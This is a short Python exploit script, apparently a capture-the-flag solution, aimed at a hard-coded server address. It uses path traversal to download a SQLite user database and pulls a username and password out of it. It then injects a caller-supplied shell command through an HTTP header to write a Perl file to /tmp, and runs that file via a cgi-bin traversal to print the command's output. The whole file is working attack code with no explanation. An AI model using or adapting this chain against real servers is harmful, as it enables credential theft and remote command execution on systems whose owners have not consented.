from socket import socket, AF_INET, SOCK_STREAM

import sqlite3

import uuid
import sys

RHOST = "52.78.31.14"
RPORT = 80
CMD = sys.argv[1]

database = "/home/user/.db"

path = b""
path += b"../../../../"
path += database.encode()
path += b"/auth"

path = b"/" + (250 - len(path)) * b"/" + path

buf = b""
buf += b"GET " + path + b" HTTP/1.1\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

start = res.index(b"\r\n\r\n")
res = res[start + 4:]

with open(".db", "wb") as f:
    f.write(res)

con = sqlite3.connect(".db")
cur = con.cursor()
cur.execute('SELECT * FROM users')
user_id, user_pw = cur.fetchone()

user_id = user_id.encode()
user_pw = user_pw.encode()

tmp = (uuid.uuid4().hex + ".pl").encode()

buf = b""
buf += b"GET /diagnosis HTTP/1.1\r\n"
buf += b"X-Target: 'exec \"" + CMD.encode() + b"\" #' 2>/tmp/" + tmp + b" \r\n"
buf += b"Cookie: auth=" + user_id + b"|" + user_pw + b"\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

path = b"/cgi-bin/"
path += b"../../../tmp/" + tmp

buf = b""
buf += b"GET " + path + b" HTTP/1.1\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

start = res.index(b"\r\n\r\n")
res = res[start + 4:]

print(res.decode())